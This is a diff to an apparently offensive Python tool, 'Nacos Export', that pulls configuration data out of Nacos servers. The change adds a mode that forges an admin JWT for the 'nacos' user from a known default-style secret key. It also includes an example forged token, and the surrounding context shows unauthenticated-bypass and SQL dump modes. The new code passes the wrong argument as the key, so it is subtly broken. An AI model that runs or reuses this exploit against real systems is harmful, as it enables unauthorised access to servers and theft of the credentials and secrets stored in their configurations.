@@ -2,6 +2,10 @@ import requests
 import sys
 import urllib3
 urllib3.disable_warnings()
+import time
+from email.utils import parsedate
+import jwt
+import base64
 
 
 PROXY = {
@@ -136,11 +140,25 @@ def dump_sql(target):
                 print_output("None", content["GROUP_ID"], content["DATA_ID"], content["CONTENT"])
                 count = count + 1
     print("[+] Count: ", count)
-            
-        
+
+def gen_token(target: str, secretkey: str) -> str:
+    resp = requests.get(target, verify=False, proxies=PROXY)
+    times = resp.headers['Date']
+    times = int(time.mktime(parsedate(times)))+18000
+    secret_key = base64.b64encode(secretkey.encode('utf-8')).decode('utf-8')
+    payload = {
+        "sub": "nacos",
+        "exp": times
+    }
+
+    jwt_token = jwt.encode(payload, secret_key, algorithm='HS256')
+    print("JWT TOKEN: ", jwt_token)
+    return jwt_token
+
+
 
 def usage(name: str):
-    ver = "v1.1.1"
+    ver = "v1.2.0"
     print("""
  ______________
 < Nacos Export >         @Author: Arm!tage
@@ -153,13 +171,15 @@ def usage(name: str):
 
 Usage:
     python3 {script} <URL> <USERNAME> <PASSWORD>
+    python3 {script} <URL> secertkey <SECRETKEY>
     python3 {script} <URL> <TOKEN>
     python3 {script} <URL> bypass|unauth
     python3 {script} <URL> sql
 
 Example:
     python3 {script} http://TARGET:8848/nacos nacos nacos
-    python3 {script} http://TARGET:8848/nacos eyJhbGciOiJIXXXXXXXXXXXX
+    python3 {script} http://TARGET:8848/nacos secretkey SecretKey012345678901234567890123456789012345678901234567890123456789
+    python3 {script} http://TARGET:8848/nacos eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6OTk5OTk5OTk5OTl9.-isk56R8NfioHVYmpj4oz92nUteNBCN3HRd0-Hfk76g
     python3 {script} http://TARGET:8848/nacos unauth
     python3 {script} http://TARGET:8848/nacos sql
 """.format(script=name, version=ver))
@@ -174,11 +194,16 @@ if __name__ == '__main__':
     print("[+] Target: ", target)
     token = ""
     if len(sys.argv) == 4:
-        print("[+] Username: ", sys.argv[2])
-        print("[+] Password: ", sys.argv[3])
-        print("\n")
-        token = login(target, sys.argv[2], sys.argv[3])
-        dump_config_content(target, token)
+        if sys.argv[2] == "secretkey":
+            print("[+] SecertKey: ", sys.argv[3])
+            token = gen_token(target, sys.argv[2])
+            dump_config_content(target, token)
+        else:
+            print("[+] Username: ", sys.argv[2])
+            print("[+] Password: ", sys.argv[3])
+            print("\n")
+            token = login(target, sys.argv[2], sys.argv[3])
+            dump_config_content(target, token)
     elif len(sys.argv) == 3:
         if sys.argv[2] == "bypass" or sys.argv[2] == "unauth":
             print("[*] Bypass/Unauth")
